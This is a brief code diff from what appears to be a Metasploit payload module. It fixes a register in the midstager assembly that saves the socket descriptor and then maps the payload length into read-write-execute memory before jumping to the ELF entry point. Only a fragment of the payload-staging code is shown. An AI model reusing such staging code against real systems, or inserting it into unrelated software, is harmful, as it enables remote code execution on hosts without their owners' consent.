@@ -39,7 +39,7 @@ module MetasploitModule
     entry_offset = elf_ep(payload)
 
     midstager_asm = %(
-      push ebx                    ; save sockfd
+      push edi                    ; save sockfd
       xor ebx, ebx                ; address
       mov ecx, #{payload.length}  ; length
       mov edx, 7                  ; PROT_READ | PROT_WRITE | PROT_EXECUTE
